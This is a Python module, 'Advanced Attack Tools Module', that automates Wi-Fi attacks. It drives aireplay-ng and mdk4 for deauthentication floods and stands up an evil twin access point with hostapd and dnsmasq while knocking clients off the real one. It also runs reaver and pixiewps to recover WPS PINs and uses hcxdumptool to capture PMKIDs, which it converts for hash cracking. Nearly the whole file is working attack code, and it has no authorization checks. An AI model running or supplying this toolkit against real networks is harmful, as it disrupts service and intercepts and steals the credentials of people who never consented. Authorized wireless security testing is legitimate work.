#!/usr/bin/env python3
"""
Advanced Attack Tools Module
Implements various wireless attack techniques
"""

import subprocess
import threading
import time
import os
import platform
import re
from datetime import datetime
from typing import List, Dict, Optional, Callable, Tuple
import json
import tempfile
import shutil


class AttackResult:
    """Represents the result of an attack"""

    def __init__(self, attack_type: str, target_bssid: str, target_essid: str,
                 success: bool = False, duration: float = 0, details: str = ""):
        self.attack_type = attack_type
        self.target_bssid = target_bssid
        self.target_essid = target_essid
        self.success = success
        self.duration = duration
        self.details = details
        self.timestamp = datetime.now()
        self.log_entries = []

    def add_log_entry(self, message: str):
        """Add a log entry"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_entries.append(f"[{timestamp}] {message}")

    def to_dict(self) -> dict:
        """Convert to dictionary"""
        return {
            'attack_type': self.attack_type,
            'target_bssid': self.target_bssid,
            'target_essid': self.target_essid,
            'success': self.success,
            'duration': self.duration,
            'details': self.details,
            'timestamp': self.timestamp.isoformat(),
            'log_entries': self.log_entries
        }


class DeauthAttack:
    """Handles deauthentication attacks"""

    def __init__(self):
        self.running = False
        self.attack_thread: Optional[threading.Thread] = None
        self.on_status_update: Optional[Callable] = None

    def start_deauth(self, interface: str, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                    count: int = 0, delay: float = 0.1) -> AttackResult:
        """Start deauthentication attack"""
        result = AttackResult("Deauthentication", bssid, "", False, 0, "")

        if self.running:
            result.details = "Attack already running"
            return result

        self.running = True
        start_time = time.time()

        try:
            result.add_log_entry(f"Starting deauth attack on {bssid}")

            if platform.system() == "Linux":
                success = self._linux_deauth(interface, bssid, client_mac, count, delay, result)
            else:
                success = self._generic_deauth(interface, bssid, client_mac, count, delay, result)

            result.success = success
            result.duration = time.time() - start_time

            if success:
                result.details = f"Deauth attack completed successfully ({result.duration:.1f}s)"
            else:
                result.details = "Deauth attack failed or was interrupted"

        except Exception as e:
            result.details = f"Deauth attack error: {e}"
            result.duration = time.time() - start_time
        finally:
            self.running = False

        return result

    def _linux_deauth(self, interface: str, bssid: str, client_mac: str,
                     count: int, delay: float, result: AttackResult) -> bool:
        """Linux-specific deauth using aireplay-ng"""
        try:
            # Check if aireplay-ng is available
            check_result = subprocess.run(['which', 'aireplay-ng'], capture_output=True, timeout=5)
            if check_result.returncode != 0:
                result.add_log_entry("aireplay-ng not found, trying mdk4")
                return self._mdk4_deauth(interface, bssid, client_mac, count, delay, result)

            # Use aireplay-ng
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count) if count > 0 else '0',
                  '-a', bssid, '-c', client_mac, interface]

            result.add_log_entry(f"Running: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     universal_newlines=True)

            packets_sent = 0
            start_time = time.time()

            while self.running:
                time.sleep(delay)

                # Check if process is still running
                if process.poll() is not None:
                    break

                # Send periodic status updates
                elapsed = time.time() - start_time
                packets_sent += 1

                if self.on_status_update:
                    self.on_status_update(f"Deauth running... {elapsed:.1f}s elapsed, {packets_sent} bursts sent")

                # Stop after count if specified
                if count > 0 and packets_sent >= count:
                    break

            # Terminate process
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=5)

            result.add_log_entry(f"Sent {packets_sent} deauth bursts")
            return True

        except Exception as e:
            result.add_log_entry(f"aireplay-ng deauth error: {e}")
            return False

    def _mdk4_deauth(self, interface: str, bssid: str, client_mac: str,
                    count: int, delay: float, result: AttackResult) -> bool:
        """Deauth using mdk4 (alternative tool)"""
        try:
            # Create filter file for mdk4
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(f"{bssid}\n")
                filter_file = f.name

            cmd = ['sudo', 'mdk4', interface, 'd', '-c', filter_file]

            if client_mac != "FF:FF:FF:FF:FF:FF":
                cmd.extend(['-s', client_mac])

            result.add_log_entry(f"Running: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     universal_newlines=True)

            start_time = time.time()
            packets_sent = 0

            while self.running and (count == 0 or packets_sent < count):
                time.sleep(delay)

                if process.poll() is not None:
                    break

                packets_sent += 1

                if self.on_status_update:
                    elapsed = time.time() - start_time
                    self.on_status_update(f"Deauth running... {elapsed:.1f}s elapsed")

            if process.poll() is None:
                process.terminate()

            # Clean up
            try:
                os.unlink(filter_file)
            except:
                pass

            return True

        except Exception as e:
            result.add_log_entry(f"mdk4 deauth error: {e}")
            return False

    def _generic_deauth(self, interface: str, bssid: str, client_mac: str,
                       count: int, delay: float, result: AttackResult) -> bool:
        """Generic deauth method (limited functionality)"""
        result.add_log_entry("Generic deauth not fully supported on this platform")
        time.sleep(1)
        return False

    def stop_deauth(self):
        """Stop deauthentication attack"""
        self.running = False


class EvilTwinAttack:
    """Handles evil twin attacks (AP impersonation)"""

    def __init__(self):
        self.running = False
        self.attack_thread: Optional[threading.Thread] = None
        self.on_status_update: Optional[Callable] = None

    def start_evil_twin(self, interface: str, target_essid: str, target_bssid: str,
                       channel: int, capture_interface: str = "") -> AttackResult:
        """Start evil twin attack"""
        result = AttackResult("Evil Twin", target_bssid, target_essid, False, 0, "")

        if self.running:
            result.details = "Attack already running"
            return result

        self.running = True
        start_time = time.time()

        try:
            result.add_log_entry(f"Starting evil twin attack on '{target_essid}' ({target_bssid})")

            if platform.system() == "Linux":
                success = self._linux_evil_twin(interface, target_essid, target_bssid,
                                              channel, capture_interface, result)
            else:
                success = self._generic_evil_twin(interface, target_essid, target_bssid,
                                                channel, result)

            result.success = success
            result.duration = time.time() - start_time

            if success:
                result.details = f"Evil twin attack completed ({result.duration:.1f}s)"
            else:
                result.details = "Evil twin attack failed or was interrupted"

        except Exception as e:
            result.details = f"Evil twin attack error: {e}"
            result.duration = time.time() - start_time
        finally:
            self.running = False

        return result

    def _linux_evil_twin(self, interface: str, essid: str, bssid: str, channel: int,
                        capture_interface: str, result: AttackResult) -> bool:
        """Linux evil twin using hostapd and dnsmasq"""
        try:
            # Create hostapd configuration
            hostapd_config = f"""interface={interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

            # If target BSSID is specified, try to match it (though this may not work with all drivers)
            if bssid:
                hostapd_config += f"bssid={bssid}\n"

            config_file = "/tmp/hostapd_evil_twin.conf"
            with open(config_file, 'w') as f:
                f.write(hostapd_config)

            # Create dnsmasq configuration for DHCP
            dnsmasq_config = f"""interface={interface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""

            dnsmasq_file = "/tmp/dnsmasq_evil_twin.conf"
            with open(dnsmasq_file, 'w') as f:
                f.write(dnsmasq_config)

            result.add_log_entry("Created configuration files")

            # Start hostapd
            hostapd_cmd = ['sudo', 'hostapd', config_file]
            hostapd_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE, universal_newlines=True)

            result.add_log_entry("Started hostapd")

            # Start dnsmasq
            dnsmasq_cmd = ['sudo', 'dnsmasq', '-C', dnsmasq_file, '-d']
            dnsmasq_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE, universal_newlines=True)

            result.add_log_entry("Started dnsmasq")

            # Start deauth attack on legitimate AP if capture interface provided
            deauth_process = None
            if capture_interface:
                deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, capture_interface]
                deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)

                result.add_log_entry("Started deauth attack on legitimate AP")

            start_time = time.time()

            # Monitor processes
            while self.running:
                time.sleep(1)

                # Check if processes are still running
                if hostapd_process.poll() is not None:
                    result.add_log_entry("hostapd process terminated")
                    break

                if dnsmasq_process.poll() is not None:
                    result.add_log_entry("dnsmasq process terminated")
                    break

                elapsed = time.time() - start_time
                if self.on_status_update:
                    self.on_status_update(f"Evil twin running... {elapsed:.1f}s elapsed")

            # Clean up
            if hostapd_process.poll() is None:
                hostapd_process.terminate()
            if dnsmasq_process.poll() is None:
                dnsmasq_process.terminate()
            if deauth_process and deauth_process.poll() is None:
                deauth_process.terminate()

            # Remove config files
            try:
                os.unlink(config_file)
                os.unlink(dnsmasq_file)
            except:
                pass

            return True

        except Exception as e:
            result.add_log_entry(f"Linux evil twin error: {e}")
            return False

    def _generic_evil_twin(self, interface: str, essid: str, bssid: str,
                          channel: int, result: AttackResult) -> bool:
        """Generic evil twin (limited functionality)"""
        result.add_log_entry("Evil twin attack not supported on this platform")
        time.sleep(1)
        return False

    def stop_evil_twin(self):
        """Stop evil twin attack"""
        self.running = False


class WPSAttack:
    """Handles WPS (Wi-Fi Protected Setup) attacks"""

    def __init__(self):
        self.running = False
        self.attack_thread: Optional[threading.Thread] = None
        self.on_status_update: Optional[Callable] = None

    def start_wps_attack(self, interface: str, bssid: str, essid: str = "",
                        pixie_dust: bool = False, brute_force: bool = False) -> AttackResult:
        """Start WPS attack"""
        result = AttackResult("WPS Attack", bssid, essid, False, 0, "")

        if self.running:
            result.details = "Attack already running"
            return result

        self.running = True
        start_time = time.time()

        try:
            result.add_log_entry(f"Starting WPS attack on {bssid}")

            if platform.system() == "Linux":
                success = self._linux_wps_attack(interface, bssid, essid, pixie_dust,
                                               brute_force, result)
            else:
                success = self._generic_wps_attack(interface, bssid, result)

            result.success = success
            result.duration = time.time() - start_time

            if success:
                result.details = f"WPS attack completed ({result.duration:.1f}s)"
            else:
                result.details = "WPS attack failed or was interrupted"

        except Exception as e:
            result.details = f"WPS attack error: {e}"
            result.duration = time.time() - start_time
        finally:
            self.running = False

        return result

    def _linux_wps_attack(self, interface: str, bssid: str, essid: str,
                         pixie_dust: bool, brute_force: bool, result: AttackResult) -> bool:
        """Linux WPS attack using reaver or pixiewps"""
        try:
            # Check for reaver
            reaver_check = subprocess.run(['which', 'reaver'], capture_output=True, timeout=5)
            pixiewps_check = subprocess.run(['which', 'pixiewps'], capture_output=True, timeout=5)

            if pixie_dust and pixiewps_check.returncode == 0:
                # Pixie dust attack
                result.add_log_entry("Using pixie dust attack")

                # First get WPS PIN using pixiewps
                wash_cmd = ['sudo', 'wash', '-i', interface, '-c', '1']  # Get channel
                wash_result = subprocess.run(wash_cmd, capture_output=True, text=True, timeout=10)

                channel = "6"  # Default
                if wash_result.returncode == 0:
                    for line in wash_result.stdout.split('\n'):
                        if bssid in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                channel = parts[2]

                # Run reaver with pixiewps
                cmd = ['sudo', 'reaver', '-i', interface, '-b', bssid, '-c', channel,
                      '-vv', '-K', '1', '-f']

                result.add_log_entry(f"Running: {' '.join(cmd)}")

            elif reaver_check.returncode == 0:
                # Standard reaver attack
                result.add_log_entry("Using reaver attack")

                cmd = ['sudo', 'reaver', '-i', interface, '-b', bssid, '-vv', '-c', '6']

                if brute_force:
                    cmd.extend(['-f', '-N'])  # Brute force PIN
                else:
                    cmd.extend(['-S'])  # Use small DH keys

            else:
                result.add_log_entry("Neither reaver nor pixiewps found")
                return False

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     universal_newlines=True)

            start_time = time.time()

            while self.running:
                time.sleep(1)

                if process.poll() is not None:
                    break

                elapsed = time.time() - start_time
                if self.on_status_update:
                    self.on_status_update(f"WPS attack running... {elapsed:.1f}s elapsed")

                # Check for success indicators
                try:
                    output = process.stdout.readline()
                    if output:
                        result.add_log_entry(output.strip())
                        if "WPS PIN" in output or "WPA PSK" in output:
                            result.add_log_entry("WPS PIN recovered!")
                            break
                except:
                    pass

            if process.poll() is None:
                process.terminate()

            return True

        except Exception as e:
            result.add_log_entry(f"WPS attack error: {e}")
            return False

    def _generic_wps_attack(self, interface: str, bssid: str, result: AttackResult) -> bool:
        """Generic WPS attack (limited functionality)"""
        result.add_log_entry("WPS attack not supported on this platform")
        time.sleep(1)
        return False

    def stop_wps_attack(self):
        """Stop WPS attack"""
        self.running = False


class PMKIDAttack:
    """Handles PMKID attacks"""

    def __init__(self):
        self.running = False
        self.attack_thread: Optional[threading.Thread] = None
        self.on_status_update: Optional[Callable] = None

    def start_pmkid_attack(self, interface: str, bssid: str = "", channel: int = 0,
                          timeout: int = 60) -> AttackResult:
        """Start PMKID attack"""
        result = AttackResult("PMKID Attack", bssid, "", False, 0, "")

        if self.running:
            result.details = "Attack already running"
            return result

        self.running = True
        start_time = time.time()

        try:
            result.add_log_entry(f"Starting PMKID attack on {bssid or 'all networks'}")

            if platform.system() == "Linux":
                success = self._linux_pmkid_attack(interface, bssid, channel, timeout, result)
            else:
                success = self._generic_pmkid_attack(interface, bssid, result)

            result.success = success
            result.duration = time.time() - start_time

            if success:
                result.details = f"PMKID attack completed ({result.duration:.1f}s)"
            else:
                result.details = "PMKID attack failed or was interrupted"

        except Exception as e:
            result.details = f"PMKID attack error: {e}"
            result.duration = time.time() - start_time
        finally:
            self.running = False

        return result

    def _linux_pmkid_attack(self, interface: str, bssid: str, channel: int,
                          timeout: int, result: AttackResult) -> bool:
        """Linux PMKID attack using hcxtools"""
        try:
            # Check for hcxtools
            hcx_check = subprocess.run(['which', 'hcxdumptool'], capture_output=True, timeout=5)

            if hcx_check.returncode != 0:
                result.add_log_entry("hcxdumptool not found, trying alternative methods")
                return self._alternative_pmkid(interface, bssid, channel, timeout, result)

            output_file = f"pmkid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcapng"

            cmd = ['sudo', 'hcxdumptool', '-i', interface, '-o', output_file,
                  '--enable_status', '1', '--filtermode', '1']

            if bssid:
                # Create filter list
                filter_file = f"/tmp/pmkid_filter_{bssid.replace(':', '')}.txt"
                with open(filter_file, 'w') as f:
                    f.write(f"{bssid}\n")
                cmd.extend(['--filterlist', filter_file])

            if channel:
                cmd.extend(['-c', str(channel)])

            result.add_log_entry(f"Running: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     universal_newlines=True)

            start_time = time.time()
            pmkid_found = False

            while self.running and time.time() - start_time < timeout:
                time.sleep(1)

                if process.poll() is not None:
                    break

                elapsed = time.time() - start_time
                if self.on_status_update:
                    self.on_status_update(f"PMKID attack running... {elapsed:.1f}s elapsed")

                # Check for PMKID in output
                try:
                    output = process.stderr.readline()
                    if output:
                        result.add_log_entry(output.strip())
                        if "PMKID" in output and "found" in output.lower():
                            pmkid_found = True
                            result.add_log_entry("PMKID captured!")
                except:
                    pass

            if process.poll() is None:
                process.terminate()

            # Convert to hash format for cracking
            if pmkid_found and os.path.exists(output_file):
                hash_file = output_file.replace('.pcapng', '.16800')
                convert_cmd = ['hcxpcapngtool', '-o', hash_file, output_file]
                subprocess.run(convert_cmd, capture_output=True, timeout=30)

                if os.path.exists(hash_file):
                    result.add_log_entry(f"PMKID hashes saved to {hash_file}")

            # Clean up filter file
            if bssid:
                try:
                    os.unlink(filter_file)
                except:
                    pass

            return pmkid_found

        except Exception as e:
            result.add_log_entry(f"PMKID attack error: {e}")
            return False

    def _alternative_pmkid(self, interface: str, bssid: str, channel: int,
                          timeout: int, result: AttackResult) -> bool:
        """Alternative PMKID capture method"""
        try:
            result.add_log_entry("Using alternative PMKID capture method")

            # Use airodump-ng and aircrack-ng
            capture_file = f"pmkid_alt_{datetime.now().strftime('%Y%m%d_%H%M%S')}.cap"

            # Start airodump-ng
            airodump_cmd = ['sudo', 'airodump-ng', '-w', 'pmkid_alt', '--output-format', 'pcap']

            if channel:
                airodump_cmd.extend(['-c', str(channel)])

            airodump_cmd.append(interface)

            process = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            start_time = time.time()

            while self.running and time.time() - start_time < timeout:
                time.sleep(2)

                if process.poll() is not None:
                    break

                elapsed = time.time() - start_time
                if self.on_status_update:
                    self.on_status_update(f"Alternative PMKID capture... {elapsed:.1f}s elapsed")

            if process.poll() is None:
                process.terminate()

            # Check for PMKID in capture
            if os.path.exists(capture_file):
                result.add_log_entry(f"Capture saved to {capture_file}")
                return True

            return False

        except Exception as e:
            result.add_log_entry(f"Alternative PMKID error: {e}")
            return False

    def _generic_pmkid_attack(self, interface: str, bssid: str, result: AttackResult) -> bool:
        """Generic PMKID attack (limited functionality)"""
        result.add_log_entry("PMKID attack not supported on this platform")
        time.sleep(1)
        return False

    def stop_pmkid_attack(self):
        """Stop PMKID attack"""
        self.running = False


class AttackManager:
    """Manages multiple attack types and coordinates them"""

    def __init__(self):
        self.attacks = {}
        self.results = []
        self.active_attacks = set()

    def create_deauth_attack(self, name: str) -> DeauthAttack:
        """Create a deauth attack instance"""
        attack = DeauthAttack()
        self.attacks[name] = attack
        return attack

    def create_evil_twin_attack(self, name: str) -> EvilTwinAttack:
        """Create an evil twin attack instance"""
        attack = EvilTwinAttack()
        self.attacks[name] = attack
        return attack

    def create_wps_attack(self, name: str) -> WPSAttack:
        """Create a WPS attack instance"""
        attack = WPSAttack()
        self.attacks[name] = attack
        return attack

    def create_pmkid_attack(self, name: str) -> PMKIDAttack:
        """Create a PMKID attack instance"""
        attack = PMKIDAttack()
        self.attacks[name] = attack
        return attack

    def get_attack(self, name: str):
        """Get attack instance by name"""
        return self.attacks.get(name)

    def stop_all_attacks(self):
        """Stop all active attacks"""
        for attack in self.attacks.values():
            if hasattr(attack, 'running') and attack.running:
                if hasattr(attack, 'stop_deauth'):
                    attack.stop_deauth()
                elif hasattr(attack, 'stop_evil_twin'):
                    attack.stop_evil_twin()
                elif hasattr(attack, 'stop_wps_attack'):
                    attack.stop_wps_attack()
                elif hasattr(attack, 'stop_pmkid_attack'):
                    attack.stop_pmkid_attack()

        self.active_attacks.clear()

    def save_results(self, filename: str):
        """Save attack results to file"""
        try:
            data = {
                'timestamp': datetime.now().isoformat(),
                'results': [r.to_dict() for r in self.results]
            }

            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)

        except Exception as e:
            print(f"Error saving attack results: {e}")

    def load_results(self, filename: str):
        """Load attack results from file"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)

            self.results = []
            for r_data in data.get('results', []):
                result = AttackResult(
                    r_data['attack_type'],
                    r_data['target_bssid'],
                    r_data['target_essid'],
                    r_data['success'],
                    r_data['duration'],
                    r_data['details']
                )
                result.timestamp = datetime.fromisoformat(r_data['timestamp'])
                result.log_entries = r_data.get('log_entries', [])
                self.results.append(result)

        except Exception as e:
            print(f"Error loading attack results: {e}")


# Utility functions
def check_attack_capabilities() -> Dict[str, bool]:
    """Check available attack tools"""
    capabilities = {
        'aircrack_ng': False,
        'aireplay_ng': False,
        'hostapd': False,
        'dnsmasq': False,
        'reaver': False,
        'pixiewps': False,
        'hcxdumptool': False,
        'mdk4': False,
        'hashcat': False
    }

    tools = ['aircrack-ng', 'aireplay-ng', 'hostapd', 'dnsmasq', 'reaver',
            'pixiewps', 'hcxdumptool', 'mdk4', 'hashcat']

    for tool in tools:
        try:
            result = subprocess.run(['which', tool], capture_output=True, timeout=5)
            capabilities[tool.replace('-', '_')] = result.returncode == 0
        except:
            pass

    return capabilities


def cleanup_attack_files():
    """Clean up temporary attack files using proper glob pattern matching"""
    import glob as glob_module

    patterns = ['*.cap', '*.pcapng', '*.hccapx', '*.16800', 'pmkid_*.pcapng',
               'handshake_*.cap', 'scan_*.csv', 'hostapd_*.conf', 'dnsmasq_*.conf']

    cleaned_count = 0
    for pattern in patterns:
        try:
            for file_path in glob_module.glob(pattern):
                try:
                    os.remove(file_path)
                    cleaned_count += 1
                except Exception as e:
                    print(f"Warning: Could not remove {file_path}: {e}")
        except Exception as e:
            print(f"Warning: Error cleaning pattern '{pattern}': {e}")

    if cleaned_count > 0:
        print(f"Cleaned up {cleaned_count} temporary attack file(s)")


if __name__ == "__main__":
    # Test attack capabilities
    caps = check_attack_capabilities()
    print("Available attack tools:")
    for tool, available in caps.items():
        print(f"  {tool}: {'✓' if available else '✗'}")

    # Test attack manager
    manager = AttackManager()
    deauth = manager.create_deauth_attack("test_deauth")
    print("Created deauth attack instance")

